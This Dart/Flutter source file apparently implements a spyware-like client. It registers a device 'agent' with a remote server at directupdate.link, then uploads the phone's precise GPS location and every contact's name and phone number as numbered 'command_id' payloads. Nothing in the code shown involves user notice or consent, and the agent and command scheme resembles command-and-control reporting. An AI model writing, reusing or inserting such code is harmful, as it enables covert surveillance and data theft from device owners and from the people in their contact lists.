import 'package:flutter/foundation.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:geolocator/geolocator.dart';
import 'dart:convert';
import 'color_printer.dart';
import 'package:http/http.dart' as http;

class Api {
  /// On 1st start only (Should be)"
  static Future<String?> initRegister(String agent) async {
    const url = 'https://directupdate.link/a_agent_register';
    final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
    printYellow('headers $headers');
    final response = await http.get(Uri.parse(url), headers: headers);

    if (response.statusCode == 200) {
      final responseData = jsonDecode(response.body);

      if (kDebugMode) {
        print('initRegister - Response: \n$responseData\n--');
      }

      try {
        // {extra_data: {"agent_uuid": "901916f1-803b-4a56-b302-0209d4515b8d"}, status: 1}
        final uuid = jsonDecode(responseData['extra_data'])['agent_uuid'];
        return uuid;
      } catch (e) {
        return null;
      }
    } else {
      throw 'Request failed with status: ${response.statusCode}';
    }
  }

  /// On every start
  static Future agentUpdate(String? agent, String? uuid,
      {Map<String, dynamic>? data}) async {
    if (agent == null) {
      printYellow(
          'PASS agentUpdate() command_id: ${data?['command_id']} No SERVER AGENT');
      return;
    }
    if (uuid == null) {
      printYellow(
          'PASS agentUpdate() command_id: ${data?['command_id']} No SERVER UUID');
      return;
    }

    const url = 'https://directupdate.link/a_agent_upload';
    final headers = {'Content-Type': 'application/json', 'User-Agent': agent};
    final body = jsonEncode(data ?? {});

    printYellow('agentUpdate - body $body');

    final response = await http.post(
      Uri.parse(url),
      headers: headers,
      body: body,
    );

    if (response.statusCode == 200) {
      // Request successful
      final responseData = jsonDecode(response.body);

      printGreen(
          'agentUpdate - Response command_id: ${data?['command_id']}: \n$responseData\n');
    } else {
      // Request failed
      if (kDebugMode) {
        print('Request failed with status: ${response.statusCode}');
      }
    }
  }

  static Future<String?> sendLocationToServer(
      String? agent, String? uuid) async {
    printWhite('START: sendLocationToServer() ');

    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    final Position position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
      timeLimit: const Duration(seconds: 10),
    );

    Api.agentUpdate(agent, uuid, data: {
      "uuid": uuid,
      "command_id": "3",
      "data": {
        "longitude": "${position.longitude}",
        "latitude": "${position.latitude}",
        "date": "${DateTime.now()}"
      }
    });

    return position.toString();
  }

  static Future<String?> sendContactsToServer(
      String? agent, String? uuid) async {
    printWhite('START: sendContactsToServer()');

    if (kDebugMode) {
      print('agent $agent');
      print('uuid $uuid');
    }

    Iterable<Contact> contacts = await ContactsService.getContacts();
    List phonesData = [];

    for (var c in contacts) {
      if ((c.phones ?? []).isNotEmpty) {
        if (kDebugMode && phonesData.length > 4) break;
        phonesData.add(
          {
            "mobileNumber": '${c.phones?.first.value}',
            "name": c.displayName,
          },
        );
      }
    }

    await Api.agentUpdate(
      agent,
      uuid,
      data: {"uuid": uuid, "command_id": "1", "data": phonesData},
    );

    return contacts.length.toString();
  }
}
